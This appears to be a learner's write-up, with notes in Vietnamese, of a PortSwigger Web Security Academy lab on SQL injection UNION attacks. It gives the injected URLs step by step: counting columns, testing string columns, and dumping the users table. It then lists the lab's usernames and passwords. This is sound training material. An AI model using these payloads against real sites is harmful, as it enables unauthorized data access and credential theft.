This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.
https://portswigger.net/academy/labs/launch/c94c990a42d1b1f39e53806b1d0d1ad51a43e1f2d5ec1a602c144d7817d3e91c?referrer=%2fweb-security%2fsql-injection%2funion-attacks%2flab-retrieve-data-from-other-tables
```
1. truy cập vào 1 danh mục trong list và tìm số cột: -> tìm đc 2 cột: https://0acc008504e3331083db827000ae0063.web-security-academy.net/filter?category=Accessories%20%27+UNION+SELECT+NULL,NULL--
2. xác định số cột có thể xây dựng chuỗi -> tìm đc 2 cột: https://0acc008504e3331083db827000ae0063.web-security-academy.net/filter?category=Accessories%20%27+UNION+SELECT+%27a%27,%27a%27--
3. lấy thông tin username và password: https://0acc008504e3331083db827000ae0063.web-security-academy.net/filter?category=Accessories%20%27+UNION+SELECT+username,+password+FROM+users--
4. kết quả thu được:
wiener
8h10b8aljcc57sw472et
carlos
80xsqmhbqqw5asrkbcpg
administrator
lf32halavszk0ieydpg4
5. dùng tài khoản administrator để login
```
